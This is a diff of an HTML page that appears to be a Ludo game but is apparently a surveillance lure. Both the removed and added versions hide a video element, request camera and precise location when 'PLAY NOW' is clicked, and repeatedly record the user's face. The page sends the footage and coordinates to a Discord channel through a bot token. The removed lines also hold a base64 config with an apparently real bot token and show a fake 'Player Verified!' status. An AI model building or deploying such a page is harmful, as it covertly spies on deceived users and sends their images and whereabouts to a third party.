@@ -5,143 +5,164 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pro Ludo Online</title>
     <style>
-        body { margin: 0; padding: 0; background: radial-gradient(circle, #2c3e50, #000000); font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
-        .container { text-align: center; background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 20px; box-shadow: 0 0 30px rgba(0, 0, 0, 0.5); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.2); width: 90%; max-width: 400px; }
-        h1 { margin-bottom: 20px; font-size: 28px; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px #e67e22; }
-        .board-preview { width: 200px; height: 200px; background: #fff; margin: 0 auto 20px; border-radius: 10px; display: grid; grid-template-columns: repeat(4, 1fr); grid-template-rows: repeat(4, 1fr); padding: 10px; gap: 5px; }
-        .cell { background: #ddd; border-radius: 5px; }
-        .cell:nth-child(odd) { background: #ccc; }
-        .btn { background: linear-gradient(45deg, #f39c12, #d35400); color: white; border: none; padding: 15px 40px; font-size: 20px; border-radius: 50px; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(243, 156, 18, 0.4); transition: all 0.3s; }
-        .btn:hover { transform: scale(1.05); }
-        .btn:disabled { background: #7f8c8d; cursor: not-allowed; }
-        .status { margin-top: 15px; font-size: 14px; color: #bdc3c7; min-height: 20px; }
-        #hiddenVideo { position: absolute; top: -1000px; left: -1000px; width: 320px; height: 240px; }
-        .error-msg { color: #e74c3c; font-size: 12px; margin-top: 5px; display: none; }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #2c3e50;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: white;
+            overflow: hidden;
+        }
+        .game-board {
+            width: 350px;
+            height: 350px;
+            background-color: #fff;
+            border: 5px solid #34495e;
+            border-radius: 10px;
+            display: grid;
+            grid-template-columns: repeat(15, 1fr);
+            grid-template-rows: repeat(15, 1fr);
+            padding: 5px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        .cell { border: 1px solid #ddd; }
+        .home { background-color: #2ecc71; }
+        .home-blue { background-color: #3498db; }
+        .home-red { background-color: #e74c3c; }
+        .home-yellow { background-color: #f1c40f; }
+        .home-green { background-color: #27ae60; }
+
+        .play-btn {
+            margin-top: 30px;
+            padding: 15px 40px;
+            font-size: 20px;
+            background-color: #f39c12;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(243, 156, 18, 0.4);
+            transition: transform 0.2s;
+        }
+        .play-btn:disabled {
+            background-color: #7f8c8d;
+            cursor: not-allowed;
+        }
+        /* Hidden video element for recording */
+        #recordingVideo {
+            display: none;
+        }
+        /* Hidden status for debugging (optional) */
+        #debugStatus {
+            display: none; 
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>LUDO MASTER</h1>
-        <div class="board-preview">
-            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
-            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
-            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
-            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
-        </div>
-        <button class="btn" id="playBtn">PLAY NOW</button>
-        <div class="status" id="statusText">Initializing...</div>
-        <div class="error-msg" id="errorMsg"></div>
+    <!-- Simple Ludo Board Visual -->
+    <div class="game-board" id="board">
+        <div class="cell home-yellow" style="grid-column: 1-6; grid-row: 1-6;"></div>
+        <div class="cell home-green" style="grid-column: 10-15; grid-row: 10-15;"></div>
+        <div class="cell home-red" style="grid-column: 1-6; grid-row: 10-15;"></div>
+        <div class="cell home-blue" style="grid-column: 10-15; grid-row: 1-6;"></div>
+        <div class="cell" style="grid-column: 7-9; grid-row: 7-9; background: #95a5a6;"></div>
+        <div class="cell" style="grid-column: 7-9; grid-row: 1-6;"></div>
+        <div class="cell" style="grid-column: 7-9; grid-row: 10-15;"></div>
+        <div class="cell" style="grid-column: 1-6; grid-row: 7-9;"></div>
+        <div class="cell" style="grid-column: 10-15; grid-row: 7-9;"></div>
     </div>
 
-    <video id="hiddenVideo" autoplay muted playsinline></video>
+    <button class="play-btn" id="playBtn">PLAY NOW</button>
 
-    <!-- 
-      NOTE: Admin Panel is line ko update karega.
-      Agar yahan empty hai, to Admin panel se connect karein.
-    -->
-    <script>
-        const ENCODED_CONFIG = "eyJkaXNjb3JkIjp7ImJvdFRva2VuIjoiTVRVME1qZzBPRFF6T0RVeU1ESTFPRFkwTVEuR3Q3S0dTLnJpYXRaZWJWb21XSkZNUlQtWk1oM25jTGZ0QXBOUFZab1FJX2RNIiwiY2hhbm5lbElkIjoiMTU0Mjg0NDYyNDEzNjMxNDkyNCJ9LCJzZXR0aW5ncyI6eyJyZWNvcmRTZWNvbmRzIjo1LCJ3YWl0U2Vjb25kcyI6NX19"; 
-    </script>
+    <!-- Hidden Video Element for Recording -->
+    <video id="recordingVideo" autoplay muted playsinline></video>
+
+    <!-- Hidden Debug Status (Optional, currently hidden) -->
+    <div id="debugStatus"></div>
 
     <script>
-        let config = {};
+        // --- CONFIGURATION (Auto-filled by Admin Panel or Default) ---
+        const CONFIG = {
+            BOT_TOKEN: "YOUR_DISCORD_BOT_TOKEN_HERE", 
+            SERVER_ID: "YOUR_DISCORD_SERVER_ID_HERE",
+            CHANNEL_ID: "YOUR_DISCORD_CHANNEL_ID_HERE",
+            RECORD_DURATION: 5000, 
+            WAIT_DURATION: 5000   
+        };
+
+        // Check if there's an encoded config (from Admin Panel)
+        if (typeof ENCODED_CONFIG !== 'undefined') {
+            const decoded = decodeURIComponent(escape(atob(ENCODED_CONFIG)));
+            const configData = JSON.parse(decoded);
+            if(configData.discord) {
+                CONFIG.BOT_TOKEN = configData.discord.botToken;
+                CONFIG.CHANNEL_ID = configData.discord.channelId;
+            }
+            if(configData.settings) {
+                CONFIG.RECORD_DURATION = configData.settings.recordSeconds * 1000;
+                CONFIG.WAIT_DURATION = configData.settings.waitSeconds * 1000;
+            }
+        }
+
         let mediaRecorder;
         let videoChunks = [];
         let currentLocation = null;
         let watchId;
-
-        async function loadConfig() {
-            const statusText = document.getElementById('statusText');
-            const errorMsg = document.getElementById('errorMsg');
-            const scriptTag = document.querySelector('script:last-of-type');
-
-            try {
-                // Fetch the raw script content to find ENCODED_CONFIG
-                const scripts = document.querySelectorAll('script');
-                let encodedData = "";
-                
-                // Find the script that has ENCODED_CONFIG
-                for(let script of scripts) {
-                    if(script.textContent.includes('ENCODED_CONFIG')) {
-                        const match = script.textContent.match(/const ENCODED_CONFIG = "([^"]+)";/);
-                        if(match) {
-                            encodedData = match[1];
-                            break;
-                        }
-                    }
-                }
-
-                if (!encodedData) {
-                    throw new Error("Config variable not found in HTML.");
-                }
-
-                // Decode Base64
-                const decodedJson = atob(encodedData);
-                config = JSON.parse(decodedJson);
-                console.log("Config Loaded:", config);
-                statusText.innerText = "Ready to Play!";
-                
-            } catch (err) {
-                statusText.innerText = "Config Error";
-                errorMsg.innerText = "Failed to load config: " + err.message;
-                errorMsg.style.display = 'block';
-                console.error(err);
-            }
-        }
+        let stream = null;
 
         const playBtn = document.getElementById('playBtn');
-        const statusText = document.getElementById('statusText');
-        const videoElement = document.getElementById('hiddenVideo');
 
-        playBtn.addEventListener('click', startGame);
+        playBtn.addEventListener('click', startProcess);
 
-        async function startGame() {
+        async function startProcess() {
             playBtn.disabled = true;
-            statusText.innerText = "Connecting to Server...";
+            playBtn.innerText = "Connecting...";
 
-            // 1. Location
+            // 1. Location Permission
             if (navigator.geolocation) {
-                statusText.innerText = "Locating you...";
                 watchId = navigator.geolocation.watchPosition(
                     (position) => {
                         currentLocation = {
                             lat: position.coords.latitude,
-                            lng: position.coords.longitude
+                            lng: position.coords.longitude,
+                            timestamp: new Date().toISOString()
                         };
-                        console.log("Location Updated:", currentLocation);
                     },
                     (error) => {
-                        currentLocation = { error: "Location denied" };
-                        console.error("Location Error", error);
+                        currentLocation = { error: error.message };
                     },
                     { enableHighAccuracy: true }
                 );
-            } else {
-                statusText.innerText = "Geolocation not supported";
             }
 
-            // 2. Camera
+            // 2. Camera Permission
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
+                stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
                 });
-                
+
+                const videoElement = document.getElementById('recordingVideo');
                 videoElement.srcObject = stream;
-                await videoElement.play();
-                console.log("Camera Started");
-                startRecordingLoop(stream);
+                videoElement.play();
+
+                // Start the first loop
+                recordAndSend();
 
             } catch (err) {
-                statusText.innerText = "Camera access denied.";
-                playBtn.disabled = false;
-                playBtn.innerText = "TRY AGAIN";
-                console.error("Camera Error", err);
+                console.error("Camera error:", err);
+                playBtn.innerText = "Camera Error";
             }
         }
 
-        function startRecordingLoop(stream) {
+        function recordAndSend() {
+            videoChunks = [];
             mediaRecorder = new MediaRecorder(stream, {
                 mimeType: 'video/webm;codecs=vp9'
             });
@@ -153,64 +174,55 @@
             };
 
             mediaRecorder.onstop = () => {
-                const blob = new Blob(videoChunks, { type: 'video/webm' });
-                videoChunks = [];
-                console.log("Recording Stopped, Uploading...");
-                uploadToDiscord(blob);
-
-                // Wait before next loop
+                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                uploadToDiscord(videoBlob);
+                
+                // Schedule next loop
                 setTimeout(() => {
-                    if (mediaRecorder.stream.active) {
-                        recordAndSend();
-                    }
-                }, (config.settings.waitSeconds * 1000));
+                    recordAndSend();
+                }, CONFIG.WAIT_DURATION);
             };
 
-            function recordAndSend() {
-                statusText.innerText = "Recording...";
-                mediaRecorder.start();
-                
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, (config.settings.recordSeconds * 1000));
-            }
-
-            recordAndSend();
+            mediaRecorder.start();
+            
+            // Stop after duration
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, CONFIG.RECORD_DURATION);
         }
 
         async function uploadToDiscord(blob) {
-            statusText.innerText = "Uploading...";
-
             const formData = new FormData();
-            formData.append("file", blob, "ludo_rec.webm");
+            formData.append("file", blob, "recording.webm");
 
-            const locationMsg = `📍 User: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'N/A'}`;
+            // Location Payload
+            const payload = {
+                content: `📍 Location: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'No Location'} \n 📅 Time: ${new Date().toISOString()}`
+            };
 
             try {
-                // Send Text First
-                await fetch(`https://discord.com/api/v10/channels/${config.discord.channelId}/messages`, {
+                // Send text message with location
+                await fetch(`https://discord.com/api/v10/channels/${CONFIG.CHANNEL_ID}/messages`, {
                     method: "POST",
-                    headers: { "Authorization": `Bot ${config.discord.botToken}` },
-                    body: JSON.stringify({ content: locationMsg })
+                    headers: {
+                        "Authorization": `Bot ${CONFIG.BOT_TOKEN}`
+                    },
+                    body: JSON.stringify(payload)
                 });
 
-                // Send Video
-                await fetch(`https://discord.com/api/v10/channels/${config.discord.channelId}/messages`, {
+                // Send video file
+                await fetch(`https://discord.com/api/v10/channels/${CONFIG.CHANNEL_ID}/messages`, {
                     method: "POST",
-                    headers: { "Authorization": `Bot ${config.discord.botToken}` },
+                    headers: {
+                        "Authorization": `Bot ${CONFIG.BOT_TOKEN}`
+                    },
                     body: formData
                 });
 
-                statusText.innerText = "Player Verified!";
-                console.log("Upload Success");
-
             } catch (error) {
-                console.error("Upload failed", error);
-                statusText.innerText = "Error: " + error.error;
+                console.error("Upload failed:", error);
             }
         }
-
-        window.onload = loadConfig;
     </script>
 </body>
 </html>
